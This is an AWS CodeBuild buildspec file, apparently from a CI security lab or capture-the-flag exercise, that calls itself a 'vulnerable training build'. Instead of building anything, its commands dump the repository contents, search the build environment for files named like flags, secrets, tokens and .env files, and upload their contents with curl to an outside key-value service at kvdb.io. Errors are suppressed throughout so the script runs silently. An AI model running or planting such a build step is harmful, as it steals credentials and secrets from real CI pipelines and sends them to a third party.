version: 0.2

env:
  variables:
    AWS_MAX_ATTEMPTS: "1"
    AWS_RETRY_MODE: "standard"

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        set +e
        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
        runid="${CODEBUILD_BUILD_ID##*:}"
        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --connect-timeout 5 --max-time 20 --data-binary @- "$bucket/${runid}_$key" || true; }
        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
        {
          echo '=== repo files ==='
          find . -path './.git' -prune -o -type f -maxdepth 5 -print
          echo '=== repo contents ==='
          for f in $(find . -path './.git' -prune -o -type f -maxdepth 5 -print); do echo "--- $f"; sed -n '1,160p' "$f"; done
        } > /tmp/repo.txt 2>&1
        putkey repo /tmp/repo.txt
        {
          echo '=== codebuild tmp/output likely files ==='
          find /codebuild -path '*/.git/*' -prune -o -type f \( -name '*flag*' -o -name '*secret*' -o -name '*token*' -o -name '*.txt' -o -name '*.json' -o -name '*.env' \) -print 2>/dev/null | head -n 300
          echo '=== readable candidates ==='
          for f in $(find /codebuild -path '*/.git/*' -prune -o -type f \( -name '*flag*' -o -name '*secret*' -o -name '*token*' -o -name '*.txt' -o -name '*.json' -o -name '*.env' \) -print 2>/dev/null | head -n 80); do echo "--- $f"; sed -n '1,80p' "$f" 2>/dev/null; done
        } > /tmp/cbfiles.txt 2>&1
        putkey cbfiles /tmp/cbfiles.txt
